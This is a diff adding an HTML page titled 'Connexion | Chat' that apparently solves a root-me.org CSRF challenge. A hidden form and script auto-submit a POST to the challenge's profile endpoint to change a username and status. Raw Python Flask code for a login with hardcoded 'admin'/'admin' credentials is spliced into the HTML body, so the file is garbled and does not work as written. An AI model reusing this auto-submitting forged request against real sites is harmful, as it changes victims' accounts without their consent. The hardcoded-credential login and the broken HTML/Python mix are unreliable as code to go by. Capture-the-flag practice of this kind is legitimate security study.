@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Connexion | Chat</title>
+        <link rel="stylesheet">
+    </head>
+
+    <body>
+        <iframe  name="csrf-frame"></iframe>
+    <form  id="csrf-form" target="csrf-frame" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="username" value="gnypa" />
+      <input type="hidden" name="status" value="on" />
+      <input type="submit" value="Submit request" />
+    </form>
+<script>document.getElementById("csrf-form").submit()</script>
+
+
+from flask import Flask, request
+app = Flask(__name__)
+
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.form['username']
+    password = request.form['password']
+    if username == 'admin' and password == 'admin':
+        return 'Welcome, admin!'
+    else:
+        return 'Invalid credentials. Please try again.'
+
+
+
+
+        </form>
+    </body>
